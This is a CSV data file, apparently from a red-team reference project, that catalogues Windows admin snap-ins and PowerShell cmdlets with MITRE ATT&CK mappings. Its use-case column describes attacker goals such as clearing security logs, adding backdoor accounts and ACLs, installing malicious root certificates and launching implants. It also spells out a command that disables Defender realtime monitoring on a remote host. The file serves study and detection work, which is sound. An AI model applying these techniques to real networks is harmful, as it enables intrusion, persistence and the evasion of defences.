"Name","Description","Updated","Toolsets","Commands","Commands_Command","Commands_Description","Commands_Usecases","Commands_Function","Commands_Comments","Commands_MitreAttack","Resources","Detections","Contributors","Contributors_Name","Contributors_Handle","Detections_Port","is_legit"
"eventvwr.msc","Event Viewer","2023-07-01","[''Builtin''-|-''GUI'']","","[''eventvwr.exe DC1.ad.bitsadmin.com''-|-''eventvwr.msc /computer:DC1.ad.bitsadmin.com'']","[''Event Viewer''-|-''Event Viewer'']","[''Clear the Security event log''-|-''Disable certain logs (Right click -> Disable Log)''-|-''Identify source IPs from which certain users have logged in to chase after their workstations''-|-''Configure the Security log to not overwrite events so it will just stop logging''-|-''Clear the Security event log''-|-''Disable certain logs (Right click -> Disable Log)''-|-''Identify source IPs from which certain users have logged in to chase after their workstations''-|-''Configure the Security log to not overwrite events so it will just stop logging'']","[''Logs''-|-''Logs'']","[''Alternatively, use [compmgmt.msc](../compmgmt) or launch the snap-in, right click the root node -> Connect to Another Computer''-|-''Alternatively, use [compmgmt.msc](../compmgmt) or launch the snap-in, right click the root node -> Connect to Another Computer'']","[''T1070.001''-|-''T1562.002''-|-''T1070.001''-|-''T1562.002'']","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"dssite.msc","Active Directory Sites and Services","2023-07-01","[''GUI''-|-''RSAT'']","","[''dssite.msc /domain=AD.BITSADMIN.COM''-|-''dssite.msc /server=DC1.ad.bitsadmin.com'']","[''Manage domain''-|-''Manage specific server'']","[''Collect information about sites and IP subnets''-|-''Collect information about sites and IP subnets'']","[''Domain''-|-''Domain'']","[''Does not work from the OffensiveDC, use `/server` parameter instead''-|-''None'']","[''None''-|-''None'']","None","","","Arris Huijgen","bitsadmin","389/TCP","false"
"dsa.msc","Active Directory Users and Computers","2023-07-01","[''GUI''-|-''RSAT'']","","dsa.msc /server=DC1.ad.bitsadmin.com","Active Directory Users and Computers","[''Perform reconnaissance on users, groups and computers in the domain''-|-''Add backdoor user or computer account''-|-''Modify group membership''-|-''View user's BitLocker recovery passwords'']","Domain","None","None","None","","","Arris Huijgen","bitsadmin","[''389/TCP''-|-''445/TCP'']","false"
"domain.msc","Active Directory Domains and Trusts","2023-07-01","[''GUI''-|-''RSAT'']","","domain.msc /server=DC1.ad.bitsadmin.com","Active Directory Domains and Trusts","Perform reconnaissance on domain trusts","Domain","[''Will initially show some errors because the offensive Windows host is not part of a domain''-|-''Right click the Active Directory Domains and Trusts node in the list of snap-ins and choose Change Forest or Change Domain. Now enter the FQDN of the root domain and click OK'']","T1484.002","None","","","Arris Huijgen","bitsadmin","[''389/TCP''-|-''445/TCP'']","false"
"dnsmgmt.msc","DNS Manager","2023-07-01","[''GUI''-|-''RSAT'']","","dnsmgmt.msc /ComputerName DC1.ad.bitsadmin.com","DNS Manager","Modify/create DNS record for internal phishing website","Manage","Alternatively, in GUI right click root node -> Connect to DNS Server","None","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"diskmgmt.msc","Disk Management","2023-07-01","[''Builtin''-|-''GUI'']","","compmgmt.msc","Disk Management","None","Manage","See [compmgmt.msc](../compmgmt) how to use it against a remote host. Returns errors though when connecting, so does not seem to work.","None","None","","","Arris Huijgen","bitsadmin","[''445/TCP''-|-''135/TCP'']","false"
"dhcpmgmt.msc","DHCP","2023-07-01","[''GUI''-|-''RSAT'']","","dhcpmgmt.msc /ComputerName DC1.ad.bitsadmin.com","DHCP","None","Manage","Alternatively, in GUI right click root node -> Add server","None","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"dfsmgmt.msc","DFS Management","2023-07-01","[''GUI''-|-''RSAT'']","","dfsmgmt.msc","DFS Management","None","Data","Right click root node -> Add Namespaces to Display or Add Replication Groups to Display","None","None","","","Arris Huijgen","bitsadmin","[''389/UDP''-|-''445/TCP'']","false"
"devmgmt.msc","Device Manager","2023-07-01","[''Builtin''-|-''GUI'']","","compmgmt.msc","Device Manager","None","Manage","See [compmgmt.msc](../compmgmt) how to use it against a remote host. Returns errors though when connecting, so does not seem to work","None","None","None","","Arris Huijgen","bitsadmin","","false"
"compmgmt.msc","Computer Management","2023-07-01","[''Builtin''-|-''GUI'']","","compmgmt.msc /computer:DC1.ad.bitsadmin.com","Computer Management","None","Manage","[''Includes: [taskschd.msc](../taskschd), [eventvwr.msc](../eventvwr), [fsmgmt.msc](../fsmgmt), [lusrmgr.msc](../lusrmgr), [perfmon.msc](../perfmon), [devmgmt.msc](../devmgmt), [diskmgmt.msc](../diskmgmt), [services.msc](../services) and [WmiMgmt.msc](../WmiMgmt)''-|-''Alternatively in the GUI, right click root node -> Connect to another computer -> `DC1.ad.bitsadmin.com`''-|-''Alternative way to launch: `CompMgmtLauncher.exe`'']","None","None","","","Arris Huijgen","bitsadmin","[''445/TCP''-|-''135/TCP'']","false"
"comexp.msc","Component Services","2024-04-19","[''Builtin''-|-''GUI'']","","comexp.msc","Component Services","[''Privesc: manipulate settings of COM objects so it runs with higher privileges''-|-''Modify ACLs to create a backdoor on the system'']","Manage","[''Component Services -> Computers -> Right click -> New -> Computer -> Browse -> `DC1.ad.bitsadmin.com`''-|-''Does not work from OffensiveDC''-|-''Alternative way to launch: `dcomcnfg.exe`'']","None","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"certtmpl.msc","Certificate Templates","2023-07-01","[''GUI''-|-''RSAT'']","","certtmpl.msc","Certificate Templates","Create new vulnerable templates and enroll for those as authentication backdoor","Manage","[''Right click root node -> Connect to another writable domain controller -> Change -> `ad.bitsadmin.com` -> OK''-|-''Requires OffensiveDC'']","None","None","","","Arris Huijgen","bitsadmin","389/UDP","false"
"certsrv.msc","Certificate Authority","2023-07-01","[''GUI''-|-''RSAT'']","","certsrv.msc /COMPUTER:CASUB1.AD.BITSADMIN.COM","Certificate Authority","Approve certificate requests","Manage","[''Alternatively in the GUI, right click root node -> Retarget Certification Authority -> Another Computer: `CASUB1.ad.bitsadmin.com`''-|-''Note that the Certificate Templates section returns error `Template information could not be loaded: The specified domain either does not exist or could not be contacted`'']","None","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"certmgr.msc","Certificates - Current User","2023-07-01","[''Builtin''-|-''GUI'']","","certmgr.msc","Certificates - Current User","None","Manage","Does not seem possible to use this snap-in remotely","None","None","None","","Arris Huijgen","bitsadmin","","false"
"certlm.msc","Certificates - Local Computer","2023-07-01","[''Builtin''-|-''GUI'']","","certlm.msc","Certificates - Local Computer","[''Export private keys (if marked as exportable)''-|-''Install malicious trusted root certificates'']","Manage","[''Right click -> Connect to another computer -> Enter the object name to select -> `DC1.ad.bitsadmin.com`''-|-''Quite slow when used over SOCKS'']","T1553.004","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"azman.msc","Authorization Manager","2023-07-01","[''GUI''-|-''RSAT'']","","azman.msc","Authorization Manager","None","Manage","Right click root node -> Open Authorization Store -> Active Directory or Active Directory Application Mode (ADAM) -> Browse","None","None","","","Arris Huijgen","bitsadmin","389/UDP","false"
"adsiedit.msc","ADSI Edit","2023-07-01","[''GUI''-|-''RSAT'']","","adsiedit.msc","ADSI Edit","[''Backdoor ACLs of AdminSDHolder container''-|-''Weaken security ACLs of OUs''-|-''Reset passwords''-|-''View sensitive information like LAPS passwords in the attribute editor'']","Manage","[''When it is launched from a `runas /netonly` prompt, it automatically connects to the right instance. Alternatively, right click the root node -> Connect to -> select Default (Domain or server that you logged in to)''-|-''Port 636/TCP is used in case SSL-based Encryption is selected'']","None","None","","","Arris Huijgen","bitsadmin","[''389/UDP''-|-''389/TCP''-|-''636/TCP'']","false"
"WmiMgmt.msc","WMI Control","2023-07-01","[''Builtin''-|-''GUI'']","","WmiMgmt.msc","WMI Control","Add WMI backdoor by weakening the security of the root namespace","Manage","Right click WMI Control -> Connect to another computer -> Another computer: `DC1.ad.bitsadmin.com` -> OK","T1047","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"WdsMgmt.msc","Windows Deployment Services","2023-07-01","[''GUI''-|-''RSAT'']","","WdsMgmt.msc","Windows Deployment Services","None","Manage","Right click on Servers -> Add Server -> Another computer: `DC1.ad.bitsadmin.com` -> OK","None","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"WF.msc","Windows Defender Firewall with Advanced Security","2023-07-01","[''Builtin''-|-''GUI'']","","mmc.exe","Windows Defender Firewall with Advanced Security","[''Add an exception to the filewall for a backdoor executable/port''-|-''Disable the Windows Defender Firewall'']","Manage","mmc.exe -> File -> Add/Remove Snap-In -> Windows Defender Firewall with Advanced Security -> Add -> Another computer: `W10.ad.bitsadmin.com` -> Finish -> OK","T1562.004","None","","","Arris Huijgen","bitsadmin","135/TCP","false"
"SQLServerManager16.msc","SQL Server 2022 Configuration Manager","2023-07-01","[''Extra''-|-''GUI'']","","SQLServerManager16.msc /computer:SQL1.ad.bitsadmin.com","SQL Server 2022 Configuration Manager","None","Manage","Install ""Integration Services"" in the SQL Server Express or Developer installation wizard","None","https://www.microsoft.com/en-us/evalcenter/download-sql-server-2022","","","Arris Huijgen","bitsadmin","135/TCP","false"
"SQLServerManager15.msc","SQL Server 2019 Configuration Manager","2023-07-01","[''Extra''-|-''GUI'']","","SQLServerManager15.msc /computer:SQL1.ad.bitsadmin.com","SQL Server 2019 Configuration Manager","None","Manage","Install ""Client Tools Connectivity"" in the SQL Server Express or Developer installation wizard","None","https://www.microsoft.com/en-us/evalcenter/download-sql-server-2019","","","Arris Huijgen","bitsadmin","135/TCP","false"
"RAMgmtUI.exe","Remote Access Management","2023-07-01","[''GUI''-|-''RSAT'']","","RAMgmtUI.exe -computerName DC1.ad.bitsadmin.com","Remote Access Management","None","Manage","Manage DirectAccess and VPN","None","None","","","Arris Huijgen","bitsadmin","[''445/TCP''-|-''135/TCP''-|-''5985/TCP''-|-''389/UDP'']","false"
"Microsoft.IdentityServer.msc","AD FS Management","2024-12-13","[''GUI''-|-''Server'']","","%SystemRoot%\ADFS\Microsoft.IdentityServer.msc","AD FS Management","None","Manage","Seems not possible to use this MMC remotely. Use the ADFS PowerShell module instead","None","None","None","","Arris Huijgen","bitsadmin","","false"
"DevModeRunAsUserConfig.msc","Group policy settings: Start Menu and Taskbar","2023-07-01","[''Builtin''-|-''GUI'']","","gpedit.msc","Group policy settings: Start Menu and Taskbar","None","Domain","[''For remote use, see [gpedit.msc](../gpedit)''-|-''Equivalent to gpedit.msc -> User Configuration -> Administrative Templates -> Start Menu and Taskbar'']","None","None","","","Arris Huijgen","bitsadmin","445/TCP","false"
"CluAdmin.msc","Failover Cluster Manager","2023-07-01","[''GUI''-|-''RSAT'']","","CluAdmin.msc","Failover Cluster Manager","None","Manage","Right click Failover Cluster Manager -> Connect to Cluster -> Browse","None","None","","","Arris Huijgen","bitsadmin","389/UDP","false"
"AdRmsAdmin.msc","Active Directory Rights Management Services","2023-07-01","[''GUI''-|-''RSAT'']","","AdRmsAdmin.msc","Active Directory Rights Management Services","None","Domain","Right click -> Add Cluster -> Connect to: Remote computer","None","None","","","Arris Huijgen","bitsadmin","[''80/TCP''-|-''443/TCP'']","false"
"Write-EventLog","Writes an event to an event log.","2023-07-01","[''Builtin''-|-''TODO'']","","Write-EventLog","TODO","None","Logs","PowerShell Module: `Microsoft.PowerShell.Management`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Unregister-ScheduledTask","Unregisters a scheduled task","2023-07-01","[''Builtin''-|-''CIMSession'']","","Unregister-ScheduledTask -CimSession $s Backdoor -Confirm:$false","Remove scheduled task","Remove persistence","Execute","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `ScheduledTasks`'']","[''T1053.005''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Unlock-ADAccount","Unlocks an Active Directory account","2023-07-01","[''RSAT''-|-''TODO'']","","Unlock-ADAccount","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Uninstall-WindowsFeature","Uninstalls specified Windows Server roles, role services, and features from a computer that is running Windows Server 2012 R2","2023-07-01","[''RSAT''-|-''TODO'']","","Uninstall-WindowsFeature","TODO","None","Manage","PowerShell Module: `ServerManager`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Test-NetConnection","Displays diagnostic information for a connection","2023-07-01","[''Builtin''-|-''TODO'']","","Test-NetConnection","TODO","None","Network","PowerShell Module: `NetTCPIP`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Test-Connection","Sends ICMP echo request packets, or pings, to one or more computers.","2023-07-01","[''Builtin''-|-''TODO'']","","Test-Connection DC1.ad.bitsadmin.com","None","None","Network","By default uses ICMP, however provides a number of parameters related to authentication","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Stop-NetEventSession","Stops event and packet capture for a network event session","2023-07-01","[''Builtin''-|-''CIMSession'']","","Stop-NetEventSession -Name sess -CimSession $s","Stop packet capture","Sniff authentication traffic on a domain controller and locally crack the hashes","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''See all details in [New-NetEventSession](../New-NetEventSession)''-|-''PowerShell Module: `NetEventPacketCapture`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Stop-EtwTraceSession","Stops the specified ETW session","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Stop-EtwTraceSession -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `EventTracingManagement`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Stop-Computer","Stops (shuts down) local and remote computers","2023-07-01","Builtin","","Stop-Computer -ComputerName W10.ad.bitsadmin.com,w11.ad.bitsadmin.com -Force","Shutdown machines","Make machine unavailable","Sessions","PowerShell Module: `Microsoft.PowerShell.Management`","T1529","None","None","","Arris Huijgen","bitsadmin","","false"
"Start-VM","Starts a virtual machine","2023-07-01","[''Builtin''-|-''CIMSession'']","","Start-VM -Name 'Windows 10 22H2' -CimSession $s","Start VM","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Hyper-V`'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Start-ScheduledTask","Starts one or more instances of a scheduled task","2023-07-01","[''Builtin''-|-''CIMSession'']","","Start-ScheduledTask -CimSession $s -TaskName Backdoor","Launch scheduled task","Launch implant","Execute","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `ScheduledTasks`'']","[''T1053.005''-|-''T1047'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Start-NetEventSession","Starts event and packet capture for a network event session","2023-07-01","[''Builtin''-|-''CIMSession'']","","Start-NetEventSession -Name sess -CimSession $s","TODO","Sniff authentication traffic on a domain controller and locally crack the hashes","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''See all details in [New-NetEventSession](../New-NetEventSession)''-|-''PowerShell Module: `NetEventPacketCapture`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Start-DscConfiguration","Applies configuration to nodes","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Start-DscConfiguration -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `PSDesiredStateConfiguration`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Show-NetFirewallRule","Displays all of the existing IPsec rules and associated objects in a fully expanded view","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Show-NetFirewallRule -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `netsecurity`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Show-EventLog","Displays the event logs of the local or a remote computer in Event Viewer","2023-07-01","[''Builtin''-|-''GUI'']","","Show-EventLog -ComputerName W10.ad.bitsadmin.com","Show Windows event log","[''Disable certain logs (Right click -> Disable Log)''-|-''Identify source IPs from which certain users have logged in to chase after their workstations'']","Logs","[''Simply launches `mmc.exe eventvwr.msc /COMPUTER:W10.ad.bitsadmin.com`''-|-''Equivalent to [eventvwr.msc](../../MMC/eventvwr)'']","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Show-DnsServerCache","Shows the records in a DNS Server Cache","2023-07-01","[''CIMSession''-|-''RSAT'']","","Show-DnsServerCache -CimSession $s","Show DNS server cached DNS entries","Reconnaissance on the network/Internet activities on the domain","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DnsServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-WSManInstance","Modifies the management information that is related to a resource","2023-07-01","[''Builtin''-|-''TODO'']","","Set-WSManInstance","TODO","None","Manage","PowerShell Module: `Microsoft.WSMan.Management`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-ScheduledTask","Modifies a scheduled task","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Set-ScheduledTask -CimSession $s","Update schedule task","None","Processes","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `ScheduledTasks`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-NetRoute","Modifies an entry or entries in the IP routing table","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Set-NetRoute -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetTCPIP`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-NetNatGlobal","Modifies global settings for NAT instances on a computer","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Set-NetNatGlobal -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-NetNat","Modifies settings for NAT objects","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Set-NetNat -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-NetFirewallSetting","Modifies the global firewall settings of the target computer","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Set-NetFirewallSetting -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `netsecurity`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-NetFirewallRule","Modifies existing firewall rules","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Set-NetFirewallRule -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `netsecurity`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-NetFirewallProfile","Configures settings that apply to the per-profile configurations of the Windows Firewall with Advanced Security","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Set-NetFirewallProfile -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `netsecurity`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-NetConnectionProfile","Changes the network category of a connection profile","2023-07-01","[''Builtin''-|-''CIMSession'']","","Set-NetConnectionProfile -CimSession $s -InterfaceAlias 'Ethernet0' -NetworkCategory Private","Update connection profile for network adapter","Update connection profile to have a different firewall policy applied","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetConnection`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-MpPreference","Configures preferences for Windows Defender scans and updates","2023-07-01","[''Builtin''-|-''CIMSession'']","","Set-MpPreference -CimSession $s -DisableRealtimeMonitoring $true","Disable realtime monitoring","Disable the realtime protection of Windows Defender to be able to drop malicious binaries","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''Note this will shown an alert to the user, alternative is to add an excluded folder using [Add-MpPreference](../Add-MpPreference)''-|-''PowerShell Module: `Defender`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-DhcpServerAuditLog","Sets the Dynamic Host Configuration Protocol (DHCP) server service audit log configuration on the DHCP server service running on the computer","2023-07-01","[''CIMSession''-|-''TODO'']","","Set-DhcpServerAuditLog -CimSession $s","TODO","None","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `DhcpServer`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-CimInstance","Modifies a CIM instance on a CIM server by calling the ModifyInstance method of the CIM class","2023-07-01","[''Builtin''-|-''CIMSession'']","","Set-CimInstance -Query 'Select * from Win32_Environment where name LIKE ""testvar%""' -Property @{VariableValue=""abcd""}","Update attribute of CIM instance","Update path variable","Manage","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `CimCmdlets`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-ADUser","Modifies an Active Directory user","2023-07-01","[''RSAT''-|-''TODO'']","","Set-ADUser","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-ADServiceAccount","Modifies an Active Directory managed service account or group managed service account object","2023-07-01","[''RSAT''-|-''TODO'']","","Set-ADServiceAccount","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-ADObject","Modifies an Active Directory object","2023-07-01","[''RSAT''-|-''TODO'']","","Set-ADObject","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-ADGroup","Modifies an Active Directory group","2023-07-01","[''RSAT''-|-''TODO'']","","Set-ADGroup","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-ADAccountPassword","Modifies the password of an Active Directory account","2023-07-01","RSAT","","[''$new = ConvertTo-SecureString 'NewPassword1!' -A -F Set-ADAccountPassword -Identity MyAccount -Reset -NewPassword $new ''-|-''$old = ConvertTo-SecureString 'OldPassword1!' -A -F $new = ConvertTo-SecureString 'NewPassword1!' -A -F Set-ADAccountPassword -Identity MyAccount -OldPassword $old -NewPassword $new '']","[''Reset password''-|-''Update password'']","[''Force reset a user's password to obtain access to the account''-|-''Update a user's password'']","[''Domain''-|-''Domain'']","[''PowerShell Module: `ActiveDirectory`''-|-''PowerShell Module: `ActiveDirectory`'']","[''T1531''-|-''T1531'']","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-ADAccountExpiration","Sets the expiration date for an Active Directory account","2023-07-01","[''RSAT''-|-''TODO'']","","Set-ADAccountExpiration","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Set-ADAccountControl","Modifies user account control (UAC) values for an Active Directory account","2023-07-01","[''RSAT''-|-''TODO'']","","Set-ADAccountControl","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Search-ADAccount","Gets Active Directory user, computer, or service accounts","2023-07-01","RSAT","","Search-ADAccount -AccountInactive -TimeSpan 30","Search for accounts","Accounts that are inactive for at least 30 days","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Restart-Computer","Restarts the operating system on local and remote computers","2023-07-01","Builtin","","Restart-Computer -ComputerName W10.ad.bitsadmin.com,W11.ad.bitsadmin.com","Restart machines","When persistence has been accomplished, a restart will trigger execution of the payload","Sessions","PowerShell Module: `Microsoft.PowerShell.Management`","T1529","None","None","","Arris Huijgen","bitsadmin","","false"
"Resolve-DnsName","Performs a DNS name query resolution for the specified name","2023-07-01","Builtin","","Resolve-DnsName -Type SRV _kerberos._tcp.ad.bitsadmin.com","Identify servers in the domain","Identify Kerberos Key Distribution Center service","Network","[''Various other queries available to identify servers at the resources link''-|-''PowerShell Module: `DnsClient`'']","T1590.002","https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/7fcdce70-5205-44d6-9c3a-260e616a2f04","None","","Arris Huijgen","bitsadmin","","false"
"Rename-ADObject","Changes the name of an Active Directory object","2023-07-01","[''RSAT''-|-''TODO'']","","Rename-ADObject","TODO","None","Domain","PowerShell Module: `ActiveDirectory`","None","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-VirtualDisk","Deletes an existing virtual disk and reclaims the used space for use by other virtual disks in the same storage pool","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Remove-VirtualDisk -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Storage`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-SmbShare","Deletes the specified SMB shares","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Remove-SmbShare -CimSession $s","TODO","None","Data","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `SmbShare`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-NetNatStaticMapping","Removes static mappings from a NAT instance","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Remove-NetNatStaticMapping -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-NetNatExternalAddress","Removes an external address from a NAT instance","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Remove-NetNatExternalAddress -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-NetNat","Removes NAT objects","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Remove-NetNat -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetNat`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-NetEventSession","Removes a network event session","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Remove-NetEventSession -CimSession $s","TODO","None","Network","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `NetEventPacketCapture`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-MpThreat","Removes active threats from a computer","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Remove-MpThreat -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Defender`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
"Remove-MpPreference","Removes exclusions or default actions","2023-07-01","[''Builtin''-|-''CIMSession''-|-''TODO'']","","Remove-MpPreference -CimSession $s","TODO","None","Misc","[''Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)''-|-''PowerShell Module: `Defender`'']","T1047","None","None","","Arris Huijgen","bitsadmin","","false"
